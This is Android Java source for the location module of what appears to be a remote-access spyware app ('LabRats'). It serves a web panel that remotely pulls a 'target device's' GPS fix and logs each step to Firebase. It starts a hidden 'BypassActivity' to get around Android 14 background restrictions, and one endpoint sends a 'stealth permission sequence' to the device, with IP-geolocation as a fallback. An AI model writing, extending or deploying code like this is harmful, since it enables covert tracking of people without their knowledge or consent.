package com.labs.labrats.modules;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.labs.labrats.CameraHelper;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.PermissionActivity;

import java.util.List;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class LocateModule extends BaseModule {

    public LocateModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/gps")) {
            return serveGpsPage(session);
        } else if (uri.equals("/gps/locate")) {
            return serveGpsLocate(params);
        } else if (uri.equals("/gps/repair")) {
            return serveGpsPermissionRequest();
        }
        return null;
    }

    private Response serveGpsPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128205; GPS_SATELLITE_UPLINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'GPS_SATELLITE_UPLINK', 'Active tracking and coordinate extraction for the target device.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
        
        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
        html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
        html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
        html.append("</div>");
        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; display: none;\" allowfullscreen></iframe>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"margin-bottom: 30px; display: flex; justify-content: center; gap: 10px;\">");
        html.append("<button onclick=\"locateDevice()\" class=\"btn\" style=\"margin: 0;\">&#128205; PING_LOCATION</button>");
        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); display: none; margin: 0;\">&#128640; OPEN_MAPS</button>");
        html.append("</div>");
        
        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">COORD_SYSTEM</div>");
        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
        html.append("</div>");

        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\" style=\"font-size: 1.35rem; opacity: 0.7;\">LOCATION_STREAM</div>");
        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
        html.append("<div>[SYSTEM] Tracker standby...</div>");
        html.append("</div></div>");

        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveGpsLocate(Map<String, String> params) {
        Log.d("LocateModule", "serveGpsLocate triggered");
        FirebaseConfig.logActivity("LOCATE_TRIGGER: Precision GPS uplink initiated");
        boolean hasFineLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarseLocation = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!hasFineLocation && !hasCoarseLocation) {
            Log.w("LocateModule", "Location permissions missing");
            return params.containsKey("json") ?
                    newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.\"}") :
                    server.serveErrorProxy("Location permission missing. Use REPAIR_PERMISSIONS in the Hardware tab.");
        }
        
        // Android 14+ background camera/location requirement bypass
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                context.startActivity(bypass);
                Thread.sleep(150); 
            } catch (Exception ignored) {}
        }

        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager == null) {
                return server.serveErrorProxy("LocationManager unavailable");
            }
            
            boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            
            Log.d("LocateModule", "GPS enabled: " + isGpsEnabled + ", Network enabled: " + isNetworkEnabled);

            if (!isGpsEnabled && !isNetworkEnabled) {
                String errorMsg = "LOCATION_SERVICES_DISABLED: The device's master location toggle is OFF. Triangle calibration is impossible.";
                FirebaseConfig.logActivity("LOCATE_ERROR: Master Location Toggle is OFF on target device.");
                return params.containsKey("json") ?
                        newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\", \"master_off\": true}") :
                        server.serveErrorProxy(errorMsg);
            }

            Location location = null;

            // Try last known location across ALL providers (gps, network, passive, fused)
            List<String> allProviders = locationManager.getAllProviders();
            if (allProviders != null) {
                for (String provider : allProviders) {
                    try {
                        Location l = locationManager.getLastKnownLocation(provider);
                        if (l == null) continue;
                        if (location == null || l.getTime() > location.getTime()) {
                            location = l;
                        }
                    } catch (SecurityException ignored) {}
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Log.d("LocateModule", "Attempting getCurrentLocation via reflection (API 30+)");
                try {
                    String provider = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) 
                                    ? LocationManager.NETWORK_PROVIDER : LocationManager.GPS_PROVIDER;
                    
                    Class<?> helper = Class.forName(com.labs.labrats.Api30Helper.class.getName());
                    java.lang.reflect.Method method = helper.getMethod("getCurrentLocation", Context.class, LocationManager.class, String.class);
                    Location freshLoc = (Location) method.invoke(null, context, locationManager, provider);
                    if (freshLoc != null) location = freshLoc;
                } catch (Exception e) {
                    Log.e("LocateModule", "Reflection error (API 30 location): " + e.getMessage());
                }
            }

            if (location == null) {
                Log.d("LocateModule", "Attempting requestLocationUpdates fallback");
                // Fallback for older devices or failed fresh fix: Active request
                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                final Location[] result = new Location[1];
                final android.location.LocationListener listener = new android.location.LocationListener() {
                    @Override public void onLocationChanged(Location loc) {
                        if (loc != null) {
                            Log.d("LocateModule", "Location changed: " + loc.getProvider() + ", acc: " + loc.getAccuracy());
                            if (result[0] == null || loc.getAccuracy() < result[0].getAccuracy()) {
                                result[0] = loc;
                                if (loc.getAccuracy() < 50) {
                                    Log.d("LocateModule", "Sufficient accuracy achieved");
                                    latch.countDown(); 
                                }
                            }
                        }
                    }
                    @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
                    @Override public void onProviderEnabled(String provider) {}
                    @Override public void onProviderDisabled(String provider) {}
                };

                new Handler(Looper.getMainLooper()).post(() -> {
                    try {
                        List<String> activeProviders = locationManager.getProviders(true);
                        Log.d("LocateModule", "Active providers for request: " + activeProviders);
                        
                        // Pick best provider for single update
                        android.location.Criteria criteria = new android.location.Criteria();
                        criteria.setAccuracy(android.location.Criteria.ACCURACY_FINE);
                        String best = locationManager.getBestProvider(criteria, true);
                        if (best != null) {
                            Log.d("LocateModule", "Best provider: " + best + ", requesting single update");
                            locationManager.requestSingleUpdate(best, listener, Looper.getMainLooper());
                        }

                        for (String p : activeProviders) {
                            if (p.equals(LocationManager.PASSIVE_PROVIDER)) continue;
                            Log.d("LocateModule", "Requesting regular updates from: " + p);
                            locationManager.requestLocationUpdates(p, 0, 0, listener, Looper.getMainLooper());
                        }
                    } catch (SecurityException e) {
                        Log.e("LocateModule", "SecurityException during updates request: " + e.getMessage());
                    }
                });

                // Increased timeout for legacy satellite locks (15 seconds)
                try { 
                    if (!latch.await(15, java.util.concurrent.TimeUnit.SECONDS)) {
                        Log.w("LocateModule", "Location fix timed out");
                    }
                } catch (Exception ignored) {}

                new Handler(Looper.getMainLooper()).post(() -> {
                    try { locationManager.removeUpdates(listener); } catch (Exception ignored) {}
                });

                if (result[0] != null) location = result[0];
            }

            if (location == null && allProviders != null) {
                Log.d("LocateModule", "Final attempt: checking last known from all providers");
                for (String p : allProviders) {
                    try {
                        Location l = locationManager.getLastKnownLocation(p);
                        if (l == null) continue;
                        if (location == null || l.getTime() > location.getTime()) {
                            location = l;
                        }
                    } catch (SecurityException ignored) {}
                }
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                Log.d("LocateModule", "Success (Provider: " + location.getProvider() + "): " + lat + ", " + lon);
                
                LabRatsWorker.execute(() -> {
                    try {
                        android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
                        List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
                        if (addresses != null && !addresses.isEmpty()) {
                            String city = addresses.get(0).getLocality();
                            if (city != null) {
                                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                                    .edit().putString("last_city", city).apply();
                            }
                        }
                    } catch (Exception ignored) {}
                });

                if (params.containsKey("json")) {
                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
                            lat, lon, location.getProvider(), location.getAccuracy(), location.getTime());
                    return newResponse(Response.Status.OK, "application/json", json);
                }

                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
                response.addHeader("Location", mapsUrl);
                return response;
            } else {
                try {
                    Log.d("LocateModule", "Attempting IP Geolocation fallback...");
                    java.net.URL ipUrl = new java.net.URL("http://ip-api.com/json/");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) ipUrl.openConnection();
                    conn.setConnectTimeout(3000);
                    conn.setReadTimeout(3000);
                    if (conn.getResponseCode() == 200) {
                        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line);
                        br.close();
                        org.json.JSONObject ipJson = new org.json.JSONObject(sb.toString());
                        if (ipJson.has("lat") && ipJson.has("lon")) {
                            double lat = ipJson.getDouble("lat");
                            double lon = ipJson.getDouble("lon");
                            String city = ipJson.optString("city", "Cellular");
                            String isp = ipJson.optString("isp", "Network");
                            Log.d("LocateModule", "IP Geolocation Success: " + lat + ", " + lon + " (" + city + ")");
                            
                            if (params.containsKey("json")) {
                                String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"ip-geolocation (%s)\", \"accuracy\": 1500.0, \"time\": %d}",
                                        lat, lon, isp, System.currentTimeMillis());
                                return newResponse(Response.Status.OK, "application/json", json);
                            }
                            
                            String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                            Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
                            response.addHeader("Location", mapsUrl);
                            return response;
                        }
                    }
                } catch (Exception e) {
                    Log.e("LocateModule", "IP Geolocation Error: " + e.getMessage());
                }

                String errorMsg = "SATELLITE_LOCK_FAILED: Triangulation timed out. Ensure the device is near a window or has a clear sky view.";
                if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    errorMsg = "LOCATION_HARDWARE_DISABLED: The user has physically disabled the device's Location toggle.";
                }
                
                return params.containsKey("json") ?
                        newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"" + errorMsg + "\"}") :
                        server.serveErrorProxy(errorMsg);
            }
        } catch (SecurityException e) {
            return params.containsKey("json") ?
                    newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied: " + e.getMessage() + "\"}") :
                    server.serveErrorProxy("Location permission denied: " + e.getMessage());
        } catch (Exception e) {
            return params.containsKey("json") ?
                    newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error: " + e.getMessage() + "\"}") :
                    server.serveErrorProxy("Location error: " + e.getMessage());
        }
    }

    private Response serveGpsPermissionRequest() {
        FirebaseConfig.logActivity("LOCATE_MAINTENANCE: Remotely dispatched permission repair sequence.");
        
        Intent i = new Intent(context, PermissionActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        context.startActivity(i);
        
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Stealth permission sequence dispatched to target device.\"}");
    }
}
